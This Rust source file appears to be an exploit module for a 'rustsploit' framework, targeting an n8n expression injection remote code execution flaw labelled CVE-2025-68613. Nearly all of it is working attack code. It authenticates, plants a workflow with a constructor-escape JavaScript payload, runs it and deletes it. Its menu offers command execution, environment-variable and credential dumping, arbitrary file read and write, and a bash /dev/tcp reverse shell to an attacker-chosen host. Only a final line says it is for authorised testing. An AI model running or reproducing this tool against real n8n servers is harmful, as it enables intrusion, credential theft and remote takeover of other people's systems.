use anyhow::{anyhow, Context, Result};
use colored::*;
use reqwest::Client;
use serde::Deserialize;
use serde_json::{json, Value};
use std::time::Duration;
use crate::utils::{normalize_target, prompt_input};

const DEFAULT_TIMEOUT_SECS: u64 = 15;

/// Display module banner
fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║   n8n Expression Injection RCE - CVE-2025-68613           ║".cyan()
    );
    println!(
        "{}",
        "║   CVSS: 10.0 (Critical)                                   ║".cyan()
    );
    println!(
        "{}",
        "║   Affected: 0.211.0 - 1.120.3, 1.121.0                    ║".cyan()
    );
    println!(
        "{}",
        "║   PoC by The StingR - Ported to Rust for rustsploit       ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

// Local normalize_target removed

/// Login response structure
#[derive(Debug, Deserialize)]
struct LoginResponse {
    data: Option<LoginData>,
    #[serde(rename = "apiKey")]
    api_key: Option<String>,
}

#[derive(Debug, Deserialize)]
struct LoginData {
    #[serde(rename = "apiKey")]
    api_key: Option<String>,
}

/// Workflow creation response
#[derive(Debug, Deserialize)]
struct WorkflowResponse {
    id: Option<String>,
    data: Option<WorkflowData>,
}

#[derive(Debug, Deserialize)]
struct WorkflowData {
    id: Option<String>,
}

/// n8n Exploit Client
struct N8nClient {
    client: Client,
    base_url: String,
    token: Option<String>,
}

impl N8nClient {
    fn new(base_url: &str) -> Result<Self> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
            .cookie_store(true)
            .build()
            .context("Failed to build HTTP client")?;

        Ok(Self {
            client,
            base_url: normalize_target(base_url)?,
            token: None,
        })
    }

    /// Authenticate to n8n and obtain access token
    async fn authenticate(&mut self, email: &str, password: &str) -> Result<bool> {
        println!("{}", "[*] Attempting authentication...".cyan());

        let login_url = format!("{}/rest/login", self.base_url);
        let login_data = json!({
            "emailOrLdapLoginId": email,
            "password": password
        });

        let response = self
            .client
            .post(&login_url)
            .json(&login_data)
            .send()
            .await
            .context("Failed to send login request")?;

        if response.status().is_success() {
            // Extract n8n-auth cookie value before consuming response (avoid borrow issues)
            let n8n_auth_cookie: Option<String> = response
                .cookies()
                .find(|c| c.name() == "n8n-auth")
                .map(|c| c.value().to_string());
            
            // Try to extract token from response body
            let text = match response.text().await {
                Ok(t) => t,
                Err(_) => String::new(),
            };
            
            if let Ok(data) = serde_json::from_str::<LoginResponse>(&text) {
                // Check nested data.apiKey first
                if let Some(ref d) = data.data {
                    if let Some(ref key) = d.api_key {
                        self.token = Some(key.clone());
                    }
                }
                // Check top-level apiKey
                if self.token.is_none() {
                    if let Some(ref key) = data.api_key {
                        self.token = Some(key.clone());
                    }
                }
            }

            // Fallback: Check for n8n-auth cookie (some versions use cookie-based auth)
            if self.token.is_none() {
                if let Some(cookie_value) = n8n_auth_cookie {
                    self.token = Some(cookie_value);
                    println!(
                        "{}",
                        "[+] Authentication successful (using n8n-auth cookie)".green()
                    );
                    return Ok(true);
                } else {
                    // No token found in response and no n8n-auth cookie
                    println!(
                        "{}",
                        "[!] Login successful but no token or auth cookie found".yellow()
                    );
                    return Ok(false);
                }
            }

            // Token found in response
            let token_preview = match self.token.as_ref() {
                Some(t) => {
                    if t.len() > 20 {
                        format!("{}...", &t[..20])
                    } else {
                        t.clone()
                    }
                }
                None => String::new(),
            };
            println!(
                "{}",
                format!("[+] Authentication successful! Token: {}", token_preview).green()
            );
            return Ok(true);
        }

        println!(
            "{}",
            format!("[-] Authentication failed: {}", response.status()).red()
        );
        Ok(false)
    }

    /// Build request with authentication headers
    fn build_request(&self, method: reqwest::Method, url: &str) -> reqwest::RequestBuilder {
        let mut req = self.client.request(method, url);
        
        if let Some(ref token) = self.token {
            req = req.header("Authorization", format!("Bearer {}", token));
        }
        req = req.header("Content-Type", "application/json");
        
        req
    }

    /// Create a malicious workflow with expression injection payload
    async fn create_malicious_workflow(
        &self,
        payload_expression: &str,
        workflow_name: &str,
    ) -> Result<Option<String>> {
        println!(
            "{}",
            format!("[*] Creating workflow: {}", workflow_name).cyan()
        );

        let workflow_url = format!("{}/rest/workflows", self.base_url);

        // Build malicious workflow with expression injection in Set node
        let workflow_data = json!({
            "name": workflow_name,
            "nodes": [
                {
                    "parameters": {
                        "values": {
                            "string": [
                                {
                                    "name": "result",
                                    "value": format!("={{{}}}", payload_expression)
                                }
                            ]
                        },
                        "options": {}
                    },
                    "name": "Set",
                    "type": "n8n-nodes-base.set",
                    "typeVersion": 2,
                    "position": [250, 300],
                    "id": "exploit-node-1"
                }
            ],
            "connections": {},
            "active": false,
            "settings": {},
            "tags": []
        });

        let response = self
            .build_request(reqwest::Method::POST, &workflow_url)
            .json(&workflow_data)
            .send()
            .await
            .context("Failed to create workflow")?;

        if response.status().is_success() {
            let text = match response.text().await {
                Ok(t) => t,
                Err(_) => String::new(),
            };
            
            if let Ok(data) = serde_json::from_str::<WorkflowResponse>(&text) {
                let workflow_id = data.id.or_else(|| data.data.and_then(|d| d.id));
                
                if let Some(ref id) = workflow_id {
                    println!(
                        "{}",
                        format!("[+] Workflow created successfully! ID: {}", id).green()
                    );
                    return Ok(workflow_id);
                }
            }
            
            // Try to extract ID from raw JSON
            if let Ok(v) = serde_json::from_str::<Value>(&text) {
                if let Some(id) = v.get("id").and_then(|v| v.as_str()) {
                    println!(
                        "{}",
                        format!("[+] Workflow created successfully! ID: {}", id).green()
                    );
                    return Ok(Some(id.to_string()));
                }
            }

            println!("{}", "[-] Failed to extract workflow ID from response".red());
            return Ok(None);
        }

        println!(
            "{}",
            format!("[-] Failed to create workflow: {}", response.status()).red()
        );
        Ok(None)
    }

    /// Execute the malicious workflow
    async fn execute_workflow(&self, workflow_id: &str) -> Result<Option<Value>> {
        println!(
            "{}",
            format!("[*] Executing workflow: {}", workflow_id).cyan()
        );

        let execute_url = format!("{}/rest/workflows/{}/run", self.base_url, workflow_id);

        let response = self
            .build_request(reqwest::Method::POST, &execute_url)
            .json(&json!({}))
            .send()
            .await
            .context("Failed to execute workflow")?;

        if response.status().is_success() {
            let text = match response.text().await {
                Ok(t) => t,
                Err(_) => String::new(),
            };
            println!("{}", "[+] Workflow executed successfully!".green());
            
            if let Ok(result) = serde_json::from_str::<Value>(&text) {
                return Ok(Some(result));
            }
            return Ok(Some(Value::String(text)));
        }

        println!(
            "{}",
            format!("[-] Failed to execute workflow: {}", response.status()).red()
        );
        Ok(None)
    }

    /// Delete the test workflow
    async fn cleanup_workflow(&self, workflow_id: &str) {
        println!(
            "{}",
            format!("[*] Cleaning up workflow: {}", workflow_id).cyan()
        );

        let delete_url = format!("{}/rest/workflows/{}", self.base_url, workflow_id);

        match self
            .build_request(reqwest::Method::DELETE, &delete_url)
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().is_success() {
                    println!("{}", "[+] Workflow deleted successfully".green());
                } else {
                    println!(
                        "{}",
                        format!("[!] Failed to delete workflow: {}", resp.status()).yellow()
                    );
                }
            }
            Err(e) => {
                println!(
                    "{}",
                    format!("[!] Error deleting workflow: {}", e).yellow()
                );
            }
        }
    }

    /// Payload: Gather system information
    async fn exploit_info(&self) -> Result<bool> {
        println!("{}", "\n=== INFORMATION GATHERING ===".cyan().bold());

        let payload = r#"this.constructor.constructor('return JSON.stringify({platform: process.platform, arch: process.arch, version: process.version, cwd: process.cwd(), user: process.env.USER || process.env.USERNAME})')()"#;

        let workflow_id = match self.create_malicious_workflow(payload, "info-gathering").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        tokio::time::sleep(Duration::from_secs(2)).await;
        let result = self.execute_workflow(&workflow_id).await?;

        if let Some(data) = result {
            println!("{}", "\n[+] System Information:".green());
            match serde_json::to_string_pretty(&data) {
                Ok(s) => println!("{}", s),
                Err(_) => println!("[!] Failed to format JSON output"),
            }
        }

        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }

    /// Payload: Execute arbitrary system command
    async fn exploit_command(&self, command: &str) -> Result<bool> {
        println!(
            "{}",
            format!("\n=== COMMAND EXECUTION: {} ===", command).cyan().bold()
        );

        // Escape quotes in command
        let escaped_cmd = command.replace('"', "\\\"");
        let payload = format!(
            r#"this.constructor.constructor('return require("child_process").execSync("{}").toString()')()"#,
            escaped_cmd
        );

        let workflow_id = match self.create_malicious_workflow(&payload, "cmd-exec").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        tokio::time::sleep(Duration::from_secs(2)).await;
        let result = self.execute_workflow(&workflow_id).await?;

        if let Some(data) = result {
            println!("{}", "\n[+] Command Output:".green());
            match serde_json::to_string_pretty(&data) {
                Ok(s) => println!("{}", s),
                Err(_) => println!("[!] Failed to format JSON output"),
            }
        }

        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }

    /// Payload: Extract environment variables
    async fn exploit_env(&self) -> Result<bool> {
        println!(
            "{}",
            "\n=== EXTRACTING ENVIRONMENT VARIABLES ===".cyan().bold()
        );

        let payload = r#"this.constructor.constructor('return JSON.stringify(process.env, null, 2)')()"#;

        let workflow_id = match self.create_malicious_workflow(payload, "env-extract").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        tokio::time::sleep(Duration::from_secs(2)).await;
        let result = self.execute_workflow(&workflow_id).await?;

        if let Some(data) = result {
            println!(
                "{}",
                "\n[+] Environment Variables (may contain credentials):".green()
            );
            match serde_json::to_string_pretty(&data) {
                Ok(s) => println!("{}", s),
                Err(_) => println!("[!] Failed to format JSON output"),
            }
        }

        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }

    /// Payload: Read file from filesystem
    async fn exploit_read_file(&self, filepath: &str) -> Result<bool> {
        println!(
            "{}",
            format!("\n=== READING FILE: {} ===", filepath).cyan().bold()
        );

        let escaped_path = filepath.replace('"', "\\\"");
        let payload = format!(
            r#"this.constructor.constructor('return require("fs").readFileSync("{}", "utf-8")')()"#,
            escaped_path
        );

        let workflow_id = match self.create_malicious_workflow(&payload, "file-read").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        tokio::time::sleep(Duration::from_secs(2)).await;
        let result = self.execute_workflow(&workflow_id).await?;

        if let Some(data) = result {
            println!("{}", format!("\n[+] File Contents ({}):", filepath).green());
            match serde_json::to_string_pretty(&data) {
                Ok(s) => println!("{}", s),
                Err(_) => println!("[!] Failed to format JSON output"),
            }
        }

        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }

    /// Payload: Write file to filesystem
    async fn exploit_write_file(&self, filepath: &str, content: &str) -> Result<bool> {
        println!(
            "{}",
            format!("\n=== WRITING FILE: {} ===", filepath).cyan().bold()
        );

        let escaped_path = filepath.replace('"', "\\\"");
        let escaped_content = content.replace('"', "\\\"").replace('\n', "\\n");
        let payload = format!(
            r#"this.constructor.constructor('return require("fs").writeFileSync("{}", "{}")')()"#,
            escaped_path, escaped_content
        );

        let workflow_id = match self.create_malicious_workflow(&payload, "file-write").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        tokio::time::sleep(Duration::from_secs(2)).await;
        let result = self.execute_workflow(&workflow_id).await?;

        if result.is_some() {
            println!(
                "{}",
                format!("[+] File written successfully: {}", filepath).green()
            );
        }

        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }

    /// Payload: Establish reverse shell
    async fn exploit_reverse_shell(&self, lhost: &str, lport: u16) -> Result<bool> {
        println!(
            "{}",
            format!("\n=== REVERSE SHELL: {}:{} ===", lhost, lport)
                .cyan()
                .bold()
        );
        println!(
            "{}",
            format!("[!] Make sure you have a listener running: nc -lvnp {}", lport)
                .yellow()
                .bold()
        );

        let shell_cmd = format!("bash -i >& /dev/tcp/{}/{} 0>&1", lhost, lport);
        let payload = format!(
            r#"this.constructor.constructor('return require("child_process").exec("{}")')()"#,
            shell_cmd
        );

        let workflow_id = match self.create_malicious_workflow(&payload, "revshell").await? {
            Some(id) => id,
            None => return Ok(false),
        };

        println!("{}", "[*] Triggering reverse shell...".cyan());
        tokio::time::sleep(Duration::from_secs(2)).await;
        let _ = self.execute_workflow(&workflow_id).await?;

        println!(
            "{}",
            "[+] Reverse shell triggered! Check your listener.".green()
        );

        tokio::time::sleep(Duration::from_secs(5)).await;
        self.cleanup_workflow(&workflow_id).await;
        Ok(true)
    }
}

// Local prompt removed

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    // Get credentials
    println!("{}", "[*] n8n Authentication Required".cyan());
    let email = prompt_input("Email: ")?;
    let password = prompt_input("Password: ")?;

    if email.is_empty() || password.is_empty() {
        return Err(anyhow!("Email and password are required"));
    }

    // Initialize client and authenticate
    let mut client = N8nClient::new(target)?;
    
    if !client.authenticate(&email, &password).await? {
        return Err(anyhow!("Authentication failed"));
    }

    println!();
    println!("{}", "[*] Select payload:".cyan());
    println!("  {} Gather system information", "1.".bold());
    println!("  {} Execute command", "2.".bold());
    println!("  {} Extract environment variables", "3.".bold());
    println!("  {} Read file", "4.".bold());
    println!("  {} Write file", "5.".bold());
    println!("  {} Reverse shell", "6.".bold());
    println!();

    let choice = prompt_input("Select option [1-6]: ")?;

    let success = match choice.as_str() {
        "1" => client.exploit_info().await?,
        "2" => {
            let cmd = prompt_input("Enter command to execute: ")?;
            if cmd.is_empty() {
                return Err(anyhow!("Command cannot be empty"));
            }
            client.exploit_command(&cmd).await?
        }
        "3" => client.exploit_env().await?,
        "4" => {
            let filepath = prompt_input("Enter file path to read: ")?;
            if filepath.is_empty() {
                return Err(anyhow!("File path cannot be empty"));
            }
            client.exploit_read_file(&filepath).await?
        }
        "5" => {
            let filepath = prompt_input("Enter file path to write: ")?;
            let content = prompt_input("Enter content to write: ")?;
            if filepath.is_empty() {
                return Err(anyhow!("File path cannot be empty"));
            }
            client.exploit_write_file(&filepath, &content).await?
        }
        "6" => {
            let lhost = prompt_input("Enter your listener IP (LHOST): ")?;
            let lport_str = prompt_input("Enter your listener port (LPORT): ")?;
            let lport: u16 = lport_str
                .parse()
                .map_err(|_| anyhow!("Invalid port number"))?;
            if lhost.is_empty() {
                return Err(anyhow!("LHOST cannot be empty"));
            }
            client.exploit_reverse_shell(&lhost, lport).await?
        }
        _ => {
            println!("{}", "[-] Invalid option".red());
            return Ok(());
        }
    };

    println!();
    if success {
        println!("{}", "[+] Exploitation completed successfully!".green().bold());
        println!(
            "{}",
            "[!] REMINDER: This is for authorized testing only.".yellow()
        );
    } else {
        println!("{}", "[-] Exploitation failed".red());
    }

    Ok(())
}
